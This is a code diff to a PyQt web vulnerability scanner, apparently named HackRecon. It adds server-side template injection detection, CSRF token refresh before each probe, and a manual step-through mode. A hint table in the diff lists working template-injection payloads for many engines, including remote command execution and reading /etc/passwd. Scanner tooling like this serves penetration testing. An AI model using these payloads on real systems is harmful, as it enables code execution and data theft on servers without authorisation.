@@ -49,6 +49,7 @@ from scans import (
     NoSqliScanMixin,
     CorsScanMixin,
     OpenRedirectScanMixin,
+    SstiScanMixin,
 )
 
 
@@ -295,6 +296,78 @@ def _format_response(entry: 'TrafficEntry') -> str:
 HACKRECON_CONFIG = os.path.join(
     os.path.expanduser("~"), ".config", "HackRecon", "HackRecon.config"
 )
+
+# ─────────────────────────────────────────────────────────────────────────────
+# SSTI exploitation hints shown in format_ssti_results
+# ─────────────────────────────────────────────────────────────────────────────
+_SSTI_EXPLOIT_HINTS: Dict[str, List[str]] = {
+    "Jinja2": [
+        "• RCE (unsandboxed): {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+        "• Class traversal:   {{ ''.__class__.__mro__[1].__subclasses__() }}",
+        "• File read:         {{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }}",
+        "• Config dump:       {{ config }}",
+        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
+    ],
+    "Twig": [
+        "• RCE:               {{['id']|map('system')|join}}",
+        "• Filter abuse:      {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+        "• Globals:           {{_self}}  →  {{_self.env.getGlobals()}}",
+        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
+    ],
+    "Freemarker": [
+        "• RCE:               <#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
+        "• Env list:          ${T(java.lang.System).getenv()}",
+        "• File read:         <#assign fileContent>.../etc/passwd</#assign>",
+        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
+    ],
+    "Mako": [
+        "• RCE:               <%\\nimport os\\nx=os.popen('id').read()\\n%>${x}",
+        "• Module import:     ${__import__('os').popen('id').read()}",
+        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
+    ],
+    "ERB": [
+        "• RCE:               <%= `id` %>",
+        "• File read:         <%= File.open('/etc/passwd').read %>",
+        "• Dir list:          <%= Dir.entries('/') %>",
+        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
+    ],
+    "EJS": [
+        "• RCE:               <%= require('child_process').execSync('id').toString() %>",
+        "• File read:         <%= require('fs').readFileSync('/etc/passwd','utf8') %>",
+    ],
+    "Velocity": [
+        "• RCE:               $class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
+        "• Shell exec:        #set($e='')#set($e.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke($e.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id'))",
+        "• Reference: https://portswigger.net/web-security/server-side-template-injection/exploiting",
+    ],
+    "Thymeleaf": [
+        "• RCE (SpEL):        *{T(java.lang.Runtime).getRuntime().exec('id')}",
+        "• Inline:            [[${T(java.lang.System).getenv()}]]",
+        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
+    ],
+    "Pebble": [
+        "• RCE:               {% set cmd = 'id' %}{% for i in range(0, 1) %}{{ runtime.exec(cmd) }}{% endfor %}",
+        "• getClass chain:    {{ ''.__class__.forName('java.lang.Runtime').getRuntime().exec('id') }}",
+    ],
+    "Smarty": [
+        "• RCE:               {php}echo shell_exec('id');{/php}",
+        "• Fetch:             {fetch file='/etc/passwd'}",
+        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
+    ],
+    "Handlebars": [
+        "• Prototype pollution / RCE via constructor chain:",
+        "  {{#with ''.split as |a|}}{{constructor.constructor 'return process.env' ''}}{{/with}}",
+        "• Reference: https://portswigger.net/web-security/server-side-template-injection",
+    ],
+    "Nunjucks": [
+        "• RCE:               {{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\").toString()')()}}",
+    ],
+    "Generic": [
+        "• Confirm engine:    submit {{7*'7'}} → 7777777=Jinja2, 49=Twig",
+        "• Try error probe:   ${{<%[%'\"}}%\\  to trigger and reveal engine stack-trace",
+        "• Reference: https://portswigger.net/web-security/server-side-template-injection/exploiting",
+    ],
+}
 
 
 def _load_lfi_wordlist() -> List[str]:
@@ -903,9 +976,19 @@ def _compute_scan_defaults(scan_types: List[str], request_data: Dict[str, Any]) 
             defaults |= _compute_scan_defaults(["XSS", "SQLi"], request_data)
         elif scan in ("WAF",):
             pass  # WAF scans operate on the full URL/request, not injection points
+        elif scan in ("SSTI",):
+            # SSTI: test all URL params, body params, cookies, and common headers
+            for name in params:
+                defaults.add(f"url:{name}")
+            for name in body_params:
+                defaults.add(f"body:{name}")
+            for name in cookies:
+                defaults.add(f"cookie:{name}")
+            for hname in ("User-Agent", "Referer", "X-Forwarded-For", "X-Custom-Header"):
+                defaults.add(f"header:{hname}")
         elif scan == "All":
             defaults |= _compute_scan_defaults(
-                ["XSS", "SQLi", "LFI", "CMDi", "IDOR", "SSRF", "Upload", "XXE", "NoSQLi", "CORS", "OpenRedirect"],
+                ["XSS", "SQLi", "LFI", "CMDi", "IDOR", "SSRF", "Upload", "XXE", "NoSQLi", "CORS", "OpenRedirect", "SSTI"],
                 request_data
             )
 
@@ -1076,6 +1159,35 @@ class InjectionPointSelectorDialog(QDialog):
         qrow.addStretch()
         root.addLayout(qrow)
 
+        # ── CSRF token refresh URL ────────────────────────────────────────────
+        csrf_sep = QFrame()
+        csrf_sep.setFrameShape(QFrame.HLine)
+        csrf_sep.setFrameShadow(QFrame.Sunken)
+        root.addWidget(csrf_sep)
+
+        csrf_row = QHBoxLayout()
+        csrf_row.setSpacing(8)
+        csrf_lbl = QLabel("🔄 CSRF Refresh URL:")
+        csrf_lbl.setToolTip(
+            "Optional — GET this URL before every probe request to fetch a fresh CSRF token.\n"
+            "The token is auto-scraped from hidden form fields, meta csrf-token tags,\n"
+            "or Set-Cookie headers.  Leave blank if the target has no CSRF protection."
+        )
+        csrf_lbl.setStyleSheet("color:#ccc; font-size:9pt;")
+        csrf_lbl.setFixedWidth(148)
+        self._csrf_url_edit = QLineEdit()
+        self._csrf_url_edit.setPlaceholderText(
+            "https://target.com/login  (optional — leave blank if no CSRF)"
+        )
+        self._csrf_url_edit.setStyleSheet(
+            "background:#1e2535; color:#ccc; border:1px solid #444;"
+            "border-radius:3px; padding:3px 6px;"
+        )
+        csrf_row.addWidget(csrf_lbl)
+        csrf_row.addWidget(self._csrf_url_edit, 1)
+        root.addLayout(csrf_row)
+        # ─────────────────────────────────────────────────────────────────────
+
         sep2 = QFrame()
         sep2.setFrameShape(QFrame.HLine)
         sep2.setFrameShadow(QFrame.Sunken)
@@ -1100,6 +1212,11 @@ class InjectionPointSelectorDialog(QDialog):
 
     def selected_ids(self) -> List[str]:
         return [pid for pid, cb in self._checkboxes.items() if cb.isChecked()]
+
+    @property
+    def csrf_refresh_url(self) -> str:
+        """Returns the CSRF refresh URL entered by the user, or '' if blank."""
+        return self._csrf_url_edit.text().strip()
 
 
 class TrafficEntry:
@@ -1235,6 +1352,7 @@ class ScanWorker(
     NoSqliScanMixin,
     CorsScanMixin,
     OpenRedirectScanMixin,
+    SstiScanMixin,
 ):
     """Background worker for performing vulnerability scans with advanced detection"""
     
@@ -1246,6 +1364,9 @@ class ScanWorker(
     # writes the user's URL back into self.csrf_refresh_url, then sets
     # self._csrf_option_c_ready event so the worker thread can proceed.
     csrf_option_c_needed = pyqtSignal(list, str)  # (csrf_field_names, upload_url)
+    # Emitted after each request in step mode so the UI can enable Next button.
+    # Carries the probe label (payload string) for the status bar.
+    step_paused = pyqtSignal(str)  # probe label
     
     class ErrorResponse:
         """Mock response object for failed requests"""
@@ -1308,6 +1429,14 @@ class ScanWorker(
         self._csrf_option_c_ready = _threading.Event()
         self._csrf_option_c_skip  = False
 
+        # ── One-by-one step mode ─────────────────────────────────────────────────
+        # step_mode      : enabled when the "🪜 One by one" preset is selected.
+        # _step_event     : cleared before each request; worker waits on it after
+        #                   traffic is emitted; UI slot sets it when Next is clicked.
+        self.step_mode   = False
+        self._step_event = _threading.Event()
+        self._step_event.set()   # starts set so the first request runs immediately
+
         # ── AI Payload Suggester ─────────────────────────────────────────────
         # Set by ScannerTab.start_scan() when the "🤖 AI Payloads" checkbox is on.
         # ai_suggest_payloads : boolean gate — False = feature disabled (default).
@@ -1369,6 +1498,8 @@ class ScanWorker(
                 results = self.scan_cors()
             elif self.scan_type == "OpenRedirect":
                 results = self.scan_open_redirect()
+            elif self.scan_type == "SSTI":
+                results = self.scan_ssti()
             elif self.scan_type == "Both":
                 if self.boost_mode:
                     self.scan_progress.emit("⚡ BOOST MODE: Running XSS and SQLi scans in parallel")
@@ -1393,6 +1524,7 @@ class ScanWorker(
                 nosqli_results  = self.scan_nosqli()
                 cors_results   = self.scan_cors()
                 open_redirect_results = self.scan_open_redirect()
+                ssti_results          = self.scan_ssti()
                 results = {
                     "xss":    xss_results,
                     "sqli":   sqli_results,
@@ -1405,6 +1537,7 @@ class ScanWorker(
                     "nosqli": nosqli_results,
                     "cors":   cors_results,
                     "open_redirect": open_redirect_results,
+                    "ssti":   ssti_results,
                 }
             elif "," in self.scan_type:
                 results = {}
@@ -1421,6 +1554,7 @@ class ScanWorker(
                     elif stype == "NoSQLi":  results["nosqli"] = self.scan_nosqli()
                     elif stype == "CORS":         results["cors"]          = self.scan_cors()
                     elif stype == "OpenRedirect": results["open_redirect"] = self.scan_open_redirect()
+                    elif stype == "SSTI":          results["ssti"]          = self.scan_ssti()
             else:
                 results = {"error": "Unknown scan type"}
 
@@ -1557,6 +1691,173 @@ class ScanWorker(
             _patch(raw)
             return resp
 
+    # ─────────────────────────────────────────────────────────────────────────
+    # CSRF token pre-flight refresh
+    # ─────────────────────────────────────────────────────────────────────────
+
+    # ── One-by-one step mode gate ─────────────────────────────────────────────
+    def _step_wait(self, label: str = ""):
+        """
+        In step mode: emit step_paused(label) so the UI enables the Next button,
+        then block the worker thread until the user clicks Next (which calls
+        self._step_event.set()).  No-op when step_mode is False.
+        """
+        if not getattr(self, "step_mode", False):
+            return
+        if not getattr(self, "running", True):
+            return
+        self._step_event.clear()
+        self.step_paused.emit(label)
+        while not self._step_event.wait(timeout=0.2):
+            if not self.running:
+                break
+
+    def _do_csrf_preflight(self, headers: dict, body: str):
+        """
+        If self.csrf_refresh_url is set, GET that URL, scrape the latest CSRF
+        token, and return (headers, body) with the token patched in.
+
+        Scraping order:
+          1. <input type="hidden" name="X" value="Y"> where X looks like a token
+          2. <meta name="X" content="Y"> where X looks like a csrf-token tag
+          3. Set-Cookie response cookies whose name contains csrf / xsrf
+
+        Patching order (for each scraped (name, value)):
+          • Cookie header  – replace matching cookie name's value
+          • URL-encoded body – replace matching param's value
+          • JSON body       – replace matching top-level key's value
+          • Request headers – replace X-CSRF-Token / X-XSRF-Token header value
+
+        Returns un-mutated (headers, body) unchanged when:
+          – no csrf_refresh_url is configured, or
+          – the refresh request fails, or
+          – no tokens are found in the response.
+        """
+        refresh_url = getattr(self, "csrf_refresh_url", None)
+        if not refresh_url:
+            return headers, body
+        # Guard against recursion (the refresh GET itself calls this method)
+        if getattr(self, "_csrf_preflight_active", False):
+            return headers, body
+
+        self._csrf_preflight_active = True
+        try:
+            # Use same auth/session cookies as the main scan, but no content-type
+            _keep = {"cookie", "authorization", "user-agent", "referer", "accept",
+                     "accept-language"}
+            refresh_headers = {k: v for k, v in headers.items()
+                               if k.lower() in _keep}
+
+            resp = requests.get(
+                refresh_url,
+                headers=refresh_headers,
+                timeout=getattr(self, "scan_timeout", 30),
+                verify=getattr(self, "scan_verify_ssl", False),
+                allow_redirects=True,
+            )
+
+            html_body = getattr(resp, "text", "") or ""
+            new_tokens: Dict[str, str] = {}
+
+            # ── 1. HTML hidden inputs (both attribute orders) ──────────────
+            for pat in (
+                r'<input[^>]+type=["\']?hidden["\']?[^>]+name=["\']?([^"\'>\s]+)["\']?[^>]+value=["\']([^"\']*)["\']',
+                r'<input[^>]+value=["\']([^"\']*)["\'][^>]+name=["\']?([^"\'>\s]+)["\']?[^>]+type=["\']?hidden["\']?',
+            ):
+                for m in re.finditer(pat, html_body, re.IGNORECASE):
+                    n, v = (m.group(1), m.group(2)) if "name" in pat.split("value")[0] else (m.group(2), m.group(1))
+                    if re.search(r'csrf|xsrf|token|_token', n, re.IGNORECASE):
+                        new_tokens[n] = v
+
+            # ── 2. Meta csrf-token tags (both attribute orders) ────────────
+            for pat in (
+                r'<meta[^>]+name=["\']?([^"\'>\s]+)["\']?[^>]+content=["\']([^"\']*)["\']',
+                r'<meta[^>]+content=["\']([^"\']*)["\'][^>]+name=["\']?([^"\'>\s]+)["\']?',
+            ):
+                for m in re.finditer(pat, html_body, re.IGNORECASE):
+                    n, v = (m.group(1), m.group(2)) if pat.index("name") < pat.index("content") else (m.group(2), m.group(1))
+                    if re.search(r'csrf|xsrf|token', n, re.IGNORECASE):
+                        new_tokens[n] = v
+
+            # ── 3. Response cookies ────────────────────────────────────────
+            for cname, cval in resp.cookies.items():
+                if re.search(r'csrf|xsrf', cname, re.IGNORECASE):
+                    new_tokens[cname] = cval
+
+            if not new_tokens:
+                return headers, body
+
+            self.scan_progress.emit(
+                f"  \ud83d\udd04 [CSRF] Refreshed token(s): "
+                + ", ".join(f"{n}={v[:16]}{'…' if len(v) > 16 else ''}"
+                            for n, v in new_tokens.items())
+            )
+
+            headers = dict(headers)  # don't mutate caller's dict
+
+            # ── Patch Cookie header ────────────────────────────────────────
+            cookie_key = next((k for k in headers if k.lower() == "cookie"), None)
+            if cookie_key:
+                parts = [c.strip() for c in headers[cookie_key].split(";")]
+                new_parts = []
+                replaced: set = set()
+                for part in parts:
+                    if "=" in part:
+                        cname, _ = part.split("=", 1)
+                        cname = cname.strip()
+                        if cname in new_tokens:
+                            new_parts.append(f"{cname}={new_tokens[cname]}")
+                            replaced.add(cname)
+                            continue
+                    new_parts.append(part)
+                headers[cookie_key] = "; ".join(new_parts)
+
+            # ── Patch URL-encoded body ─────────────────────────────────────
+            if body:
+                try:
+                    parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
+                    changed = False
+                    for n, v in new_tokens.items():
+                        if n in parsed:
+                            parsed[n] = [v]
+                            changed = True
+                    if changed:
+                        body = urllib.parse.urlencode(parsed, doseq=True)
+                except Exception:
+                    pass
+
+                # ── Patch JSON body ────────────────────────────────────────
+                if body.lstrip().startswith("{"):
+                    try:
+                        import json as _json
+                        jobj = _json.loads(body)
+                        changed = False
+                        for n, v in new_tokens.items():
+                            if n in jobj:
+                                jobj[n] = v
+                                changed = True
+                        if changed:
+                            body = _json.dumps(jobj)
+                    except Exception:
+                        pass
+
+            # ── Patch CSRF request headers (X-CSRF-Token etc.) ────────────
+            _CSRF_HDR_NAMES = {"x-csrf-token", "x-xsrf-token", "csrf-token",
+                               "x-csrf", "x-request-token"}
+            for hk in list(headers.keys()):
+                if hk.lower() in _CSRF_HDR_NAMES:
+                    # Use the first scraped token value
+                    headers[hk] = next(iter(new_tokens.values()))
+                    break
+
+            return headers, body
+
+        except Exception as e:
+            logger.debug(f"CSRF pre-flight error: {e}")
+            return headers, body
+        finally:
+            self._csrf_preflight_active = False
+
     def send_request_with_traffic(self, url: str, headers: dict, method: str = 'GET',
                                     body: str = '', payload: str = '', payload_type: str = '',
                                     raw_url: bool = False, allow_redirects: bool = True,
@@ -1582,13 +1883,29 @@ class ScanWorker(
         if _req_delay > 0:
             time.sleep(_req_delay)
 
-        STRIP_HEADERS = {'content-length', 'transfer-encoding', 'accept-encoding'}
+        # ── CSRF token pre-flight refresh ─────────────────────────────────────
+        # If a CSRF refresh URL was configured in the injection-point dialog,
+        # GET it before every probe to pick up a fresh token, then patch it
+        # into the headers / body we are about to send.  The flag prevents
+        # recursion when the refresh request itself calls this method.
+        headers, body = self._do_csrf_preflight(headers, body)
+        # ─────────────────────────────────────────────────────────────────────
+
+        STRIP_HEADERS = {'content-length', 'transfer-encoding'}
         # Also strip Content-Type when sending multipart so requests can set its
         # own boundary.
         if files:
             STRIP_HEADERS = STRIP_HEADERS | {'content-type'}
         headers = {k: v for k, v in headers.items()
                    if k.lower() not in STRIP_HEADERS}
+
+        # Normalise Accept-Encoding: remove whatever case-variant the original
+        # request used (e.g. "accept-encoding: gzip, deflate, br, zstd"), then
+        # set a single canonical key with only the encodings _decode_response
+        # can handle.  The case-insensitive removal prevents sending two
+        # Accept-Encoding headers when the original already had one.
+        headers = {k: v for k, v in headers.items() if k.lower() != 'accept-encoding'}
+        headers['Accept-Encoding'] = 'gzip, deflate'
 
         traffic = TrafficEntry({
             'url': url,
@@ -1604,21 +1921,14 @@ class ScanWorker(
             try:
                 start_time = time.time()
                 session    = requests.Session()
-                # Force identity encoding at the session level so requests never
-                # asks the server for compressed content.  We set "identity"
-                # explicitly rather than just popping the header because
-                # session.get() / session.post() call prepare_request() internally,
-                # which re-merges the default headers and can re-add Accept-Encoding.
-                # An explicit "identity" value survives that merge and tells the
-                # server we want an uncompressed body, eliminating the gzip-decode
-                # error caused by servers that compress despite the header mismatch.
-                session.headers["Accept-Encoding"] = "identity"
+                # Advertise the same encodings we put in headers so the session
+                # default never overrides our per-request value.
+                session.headers["Accept-Encoding"] = "gzip, deflate"
 
-                # Helper: enforce identity on a PreparedRequest just before sending,
-                # as a final safety net in case a header in `headers` or a
-                # prepare_request() call re-added it.
+                # Helper: keep the Accept-Encoding header consistent on the
+                # PreparedRequest object right before it goes on the wire.
                 def _strip_ae(prep):
-                    prep.headers["Accept-Encoding"] = "identity"
+                    prep.headers["Accept-Encoding"] = "gzip, deflate"
                     return prep
 
                 if raw_url:
@@ -1708,6 +2018,9 @@ class ScanWorker(
                 elapsed = time.time() - start_time
                 traffic.set_response(resp_obj, elapsed)
                 self.traffic_entry.emit(traffic)
+                # ── Step-mode gate: pause after emitting traffic ─────────────────
+                self._step_wait(payload or payload_type)
+                # ─────────────────────────────────────────────────────────
                 return resp_obj
 
             except Exception as e:
@@ -2406,6 +2719,8 @@ class ScannerTab(QWidget):
         self._scan_bool_consensus  = 2
         # Time-based delay threshold (seconds above baseline to flag)
         self._scan_time_threshold  = 1.5
+        # One-by-one step mode — send one request then pause until user clicks Next
+        self._scan_step_mode       = False
 
         self.init_ui()
     
@@ -2565,6 +2880,30 @@ class ScannerTab(QWidget):
         self.stop_scan_btn.clicked.connect(self.stop_scan)
         self.stop_scan_btn.setEnabled(False)
         row1.addWidget(self.stop_scan_btn)
+
+        # Next button — only visible during One-by-one step mode
+        self.step_next_btn = QPushButton("⏩ Next")
+        self.step_next_btn.setToolTip(
+            "Send the next probe request.\n"
+            "Only active in 🪜 One-by-one mode."
+        )
+        self.step_next_btn.setStyleSheet(f"""
+            QPushButton {{
+                background-color: #1565c0;
+                color: #ffffff;
+                border: none;
+                padding: 6px 14px;
+                border-radius: 4px;
+                font-weight: bold;
+            }}
+            QPushButton:hover {{ background-color: #1976d2; }}
+            QPushButton:pressed {{ background-color: #0d47a1; }}
+            QPushButton:disabled {{ background-color: {COLOR_BORDER}; color: {COLOR_TEXT_MUTED}; }}
+        """)
+        self.step_next_btn.setVisible(False)
+        self.step_next_btn.setEnabled(False)
+        self.step_next_btn.clicked.connect(self._on_step_next_clicked)
+        row1.addWidget(self.step_next_btn)
 
         # Scan Config button (⚙ icon only)
         self.scan_config_btn = QPushButton("⚙")
@@ -2789,6 +3128,23 @@ class ScannerTab(QWidget):
             "Confidence: HIGH (Location header) / MEDIUM (body JS) / LOW (CRLF)"
         )
         row2.addWidget(self.open_redirect_checkbox)
+
+        self.ssti_checkbox = QCheckBox("SSTI")
+        self.ssti_checkbox.setChecked(False)
+        self.ssti_checkbox.setToolTip(
+            "Server-Side Template Injection (SSTI) scan\n"
+            "Injects arithmetic math probes valid across multiple template engines\n"
+            "and checks whether the evaluated result (e.g. 49) appears in the response.\n\n"
+            "Phase 1 — Polyglot math probes ({{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, …)\n"
+            "Phase 2 — Engine fingerprinting (Jinja2 vs Twig vs Freemarker vs ERB …)\n"
+            "Phase 3 — Error-based detection (malformed syntax triggers engine stack-trace)\n"
+            "Phase 4 — Code-context break-out (}}{{7*7}}{{ to escape existing expressions)\n\n"
+            "Engines detected: Jinja2, Twig, Freemarker, Mako, ERB, EJS, Pebble,\n"
+            "  Thymeleaf, Velocity, Smarty, Tornado, Groovy, Nunjucks, Liquid, Pug\n"
+            "Injection points: URL params, POST body, JSON fields, Cookies, Headers\n"
+            "Confidence: HIGH (≥2 hits or hit+error) / MEDIUM (1 hit or error alone)"
+        )
+        row2.addWidget(self.ssti_checkbox)
 
         row2.addStretch()
         outer.addLayout(row2)
@@ -3698,6 +4054,7 @@ class ScannerTab(QWidget):
         self._cfg_radio_fast   = QRadioButton("⚡ Fast")
         self._cfg_radio_normal = QRadioButton("✅ Normal  (default)")
         self._cfg_radio_slow   = QRadioButton("🐢 Slow  (WAF / 429 evasion)")
+        self._cfg_radio_step   = QRadioButton("🪜 One by one  (manual step)")
 
         self._cfg_radio_fast.setToolTip(
             "Shorter timeouts, minimal delay, higher concurrency.\n"
@@ -3708,19 +4065,27 @@ class ScannerTab(QWidget):
             "Longer inter-request delays, lower concurrency, more retries.\n"
             "Use against WAFs, rate-limited endpoints, or fragile targets."
         )
+        self._cfg_radio_step.setToolTip(
+            "Send one probe request at a time and pause after each one.\n"
+            "A \"⏩ Next\" button appears in the toolbar — click it to send\n"
+            "the next request.  Useful when the result of a probe appears on\n"
+            "a separate page that you need to review manually before continuing."
+        )
 
         speed_btn_grp = QButtonGroup(dlg)
         speed_btn_grp.addButton(self._cfg_radio_fast,   0)
         speed_btn_grp.addButton(self._cfg_radio_normal, 1)
         speed_btn_grp.addButton(self._cfg_radio_slow,   2)
+        speed_btn_grp.addButton(self._cfg_radio_step,   3)
 
         # Select current preset
         {"fast": self._cfg_radio_fast, "normal": self._cfg_radio_normal,
-         "slow": self._cfg_radio_slow}.get(
+         "slow": self._cfg_radio_slow, "step": self._cfg_radio_step}.get(
             self._scan_speed_preset, self._cfg_radio_normal
         ).setChecked(True)
 
-        for rb in (self._cfg_radio_fast, self._cfg_radio_normal, self._cfg_radio_slow):
+        for rb in (self._cfg_radio_fast, self._cfg_radio_normal,
+                   self._cfg_radio_slow, self._cfg_radio_step):
             rb.setStyleSheet(f"color: {COLOR_TEXT}; font-weight: normal;")
             preset_row.addWidget(rb)
 
@@ -3912,6 +4277,11 @@ class ScannerTab(QWidget):
                 self._cfg_delay.setValue(2.0)
                 self._cfg_workers.setValue(3)
                 self._cfg_retries.setValue(2)
+            elif preset == "step":
+                self._cfg_timeout.setValue(30)
+                self._cfg_delay.setValue(0.0)
+                self._cfg_workers.setValue(1)
+                self._cfg_retries.setValue(1)
             # Show warning if Slow + Boost is active
             self._cfg_warn_lbl.setVisible(
                 preset == "slow" and self.boost_mode_checkbox.isChecked()
@@ -3921,6 +4291,7 @@ class ScannerTab(QWidget):
         self._cfg_radio_fast.toggled.connect(lambda on: on and apply_preset("fast"))
         self._cfg_radio_normal.toggled.connect(lambda on: on and apply_preset("normal"))
         self._cfg_radio_slow.toggled.connect(lambda on: on and apply_preset("slow"))
+        self._cfg_radio_step.toggled.connect(lambda on: on and apply_preset("step"))
 
         # Update summary when any manual field changes
         for w in (self._cfg_timeout, self._cfg_delay, self._cfg_workers,
@@ -3944,6 +4315,7 @@ class ScannerTab(QWidget):
             self._cfg_stop_on_first.setChecked(False)
             self._cfg_bool_consensus.setValue(2)
             self._cfg_time_threshold.setValue(1.5)
+            self._scan_step_mode = False
 
         btns.button(QDialogButtonBox.RestoreDefaults).clicked.connect(restore_defaults)
         btns.accepted.connect(dlg.accept)
@@ -3956,8 +4328,11 @@ class ScannerTab(QWidget):
                 self._scan_speed_preset = "fast"
             elif self._cfg_radio_slow.isChecked():
                 self._scan_speed_preset = "slow"
+            elif self._cfg_radio_step.isChecked():
+                self._scan_speed_preset = "step"
             else:
                 self._scan_speed_preset = "normal"
+            self._scan_step_mode = (self._scan_speed_preset == "step")
 
             self._scan_timeout          = self._cfg_timeout.value()
             self._scan_req_delay        = self._cfg_delay.value()
@@ -3970,7 +4345,7 @@ class ScannerTab(QWidget):
             self._scan_time_threshold   = self._cfg_time_threshold.value()
 
             # Update tooltip on config button to show active preset
-            preset_icon = {"fast": "⚡", "normal": "✅", "slow": "🐢"}.get(
+            preset_icon = {"fast": "⚡", "normal": "✅", "slow": "🐢", "step": "🪜"}.get(
                 self._scan_speed_preset, "✅"
             )
             self.scan_config_btn.setToolTip(
@@ -3994,6 +4369,8 @@ class ScannerTab(QWidget):
             preset = "⚡ Fast"
         elif self._cfg_radio_slow.isChecked():
             preset = "🐢 Slow"
+        elif hasattr(self, '_cfg_radio_step') and self._cfg_radio_step.isChecked():
+            preset = "🪜 One by one"
         else:
             preset = "✅ Normal"
         t  = self._cfg_timeout.value()
@@ -4034,8 +4411,9 @@ class ScannerTab(QWidget):
         scan_nosqli = self.nosqli_checkbox.isChecked()
         scan_cors   = self.cors_checkbox.isChecked()
         scan_open_redirect = self.open_redirect_checkbox.isChecked()
+        scan_ssti   = self.ssti_checkbox.isChecked()
         
-        if not any([scan_xss, scan_sqli, scan_lfi, scan_cmdi, scan_idor, scan_upload, scan_ssrf, scan_xxe, scan_nosqli, scan_cors, scan_open_redirect]):
+        if not any([scan_xss, scan_sqli, scan_lfi, scan_cmdi, scan_idor, scan_upload, scan_ssrf, scan_xxe, scan_nosqli, scan_cors, scan_open_redirect, scan_ssti]):
             QMessageBox.warning(self, "No Scan Type", "Please select at least one scan type")
             return
 
@@ -4051,12 +4429,13 @@ class ScannerTab(QWidget):
         if scan_nosqli: active.append("NoSQLi")
         if scan_cors:   active.append("CORS")
         if scan_open_redirect: active.append("OpenRedirect")
+        if scan_ssti:   active.append("SSTI")
         
         if len(active) == 1:
             scan_type = active[0]
         elif active == ["XSS", "SQLi"]:
             scan_type = "Both"
-        elif set(active) == {"XSS", "SQLi", "LFI", "CMDi", "IDOR", "Upload", "SSRF", "XXE", "NoSQLi", "CORS", "OpenRedirect"}:
+        elif set(active) == {"XSS", "SQLi", "LFI", "CMDi", "IDOR", "Upload", "SSRF", "XXE", "NoSQLi", "CORS", "OpenRedirect", "SSTI"}:
             scan_type = "All"
         else:
             # Multi-scan: encode as comma-joined string handled in run()
@@ -4336,6 +4715,14 @@ class ScannerTab(QWidget):
                 forced_injection_points = set(selected_ids)
         # ─────────────────────────────────────────────────────────────────────
 
+        # Capture pre-scan CSRF refresh URL from dialog (empty string → None)
+        _csrf_pre_url: Optional[str] = (
+            _inj_dlg.csrf_refresh_url
+            if "_inj_dlg" in dir()              # dialog shown
+            and _inj_dlg.csrf_refresh_url       # non-empty
+            else None
+        )
+
         # Mark URL as scanning (orange)
         _url_item = self.queue_table.item(row, 1)
         if _url_item:
@@ -4362,6 +4749,9 @@ class ScannerTab(QWidget):
             scan_time_threshold=self._scan_time_threshold,
         )
         self.current_scan_worker.forced_injection_points = forced_injection_points
+        # ── Pre-scan CSRF refresh URL (set in injection-point dialog) ─────────
+        if _csrf_pre_url:
+            self.current_scan_worker.csrf_refresh_url = _csrf_pre_url
         # ── AI Payload Suggester ──────────────────────────────────────────────
         if self.ai_payloads_checkbox.isChecked():
             self.current_scan_worker.ai_suggest_payloads = True
@@ -4386,12 +4776,23 @@ class ScannerTab(QWidget):
             worker._csrf_option_c_ready.set()   # unblock the scan thread
 
         self.current_scan_worker.csrf_option_c_needed.connect(_on_csrf_option_c_needed)
-        
+
+        # ── One-by-one step mode ────────────────────────────────────────────
+        if self._scan_step_mode:
+            self.current_scan_worker.step_mode = True
+            # Wire the worker's step_paused signal to enable the Next button
+            self.current_scan_worker.step_paused.connect(self._on_step_paused)
+        # ────────────────────────────────────────────────────────────────────
+
         self.start_scan_btn.setEnabled(False)
         self.stop_scan_btn.setEnabled(True)
         self.progress_bar.setVisible(True)
 
-        preset_icon = {"fast": "⚡", "normal": "✅", "slow": "🐢"}.get(self._scan_speed_preset, "✅")
+        if self._scan_step_mode:
+            self.step_next_btn.setVisible(True)
+            self.step_next_btn.setEnabled(False)   # enabled when first pause fires
+
+        preset_icon = {"fast": "⚡", "normal": "✅", "slow": "🐢", "step": "🪜"}.get(self._scan_speed_preset, "✅")
         status_msg = f"Scanning #{row + 1}... {preset_icon} {self._scan_speed_preset.capitalize()}"
         if boost_mode:
             status_msg += " | ⚡ BOOST"
@@ -4458,6 +4859,8 @@ class ScannerTab(QWidget):
                 is_vulnerable = is_vulnerable or results["cors"].get("vulnerable", False)
             if "open_redirect" in results:
                 is_vulnerable = is_vulnerable or results["open_redirect"].get("vulnerable", False)
+            if "ssti" in results:
+                is_vulnerable = is_vulnerable or results["ssti"].get("vulnerable", False)
             if "vulnerable" in results:
                 is_vulnerable = results.get("vulnerable", False)
 
@@ -4477,6 +4880,8 @@ class ScannerTab(QWidget):
         self.start_scan_btn.setEnabled(True)
         self.stop_scan_btn.setEnabled(False)
         self.progress_bar.setVisible(False)
+        self.step_next_btn.setVisible(False)
+        self.step_next_btn.setEnabled(False)
         self.scan_status_label.setText(f"✓ Scan #{queue_index + 1} complete")
         QTimer.singleShot(3000, lambda: self.scan_status_label.setText("Ready"))
     
@@ -4493,6 +4898,8 @@ class ScannerTab(QWidget):
         self.start_scan_btn.setEnabled(True)
         self.stop_scan_btn.setEnabled(False)
         self.progress_bar.setVisible(False)
+        self.step_next_btn.setVisible(False)
+        self.step_next_btn.setEnabled(False)
         self.scan_status_label.setText(f"✗ Scan #{queue_index + 1} failed")
         QTimer.singleShot(3000, lambda: self.scan_status_label.setText("Ready"))
 
@@ -4538,6 +4945,7 @@ class ScannerTab(QWidget):
             ("nosqli", "=== NOSQL INJECTION (NoSQLi) SCAN ===",                 "format_nosqli_results"),
             ("cors",           "=== CORS MISCONFIGURATION SCAN ===",                    "format_cors_results"),
